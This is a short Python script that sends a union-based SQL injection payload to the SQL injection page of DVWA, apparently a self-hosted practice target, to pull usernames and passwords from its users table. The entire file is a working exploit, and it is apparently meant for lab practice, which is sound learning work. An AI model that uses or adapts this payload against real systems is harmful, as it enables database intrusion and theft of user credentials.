import requests

url = "https://f0012fbf98204f57ae3bbf2cb76c8bce--8080.ap-shanghai2.cloudstudio.club/vulnerabilities/sqli/"
cookies = {
    "PHPSESSID":"123", #自己部署的靶场的密码
    "security":"low"
}

payload = "-1' union select user,password from dvwa.users--+"
params = {"id":payload}
resp = requests.get(url,params=params,cookies=cookies)
print(resp.text)
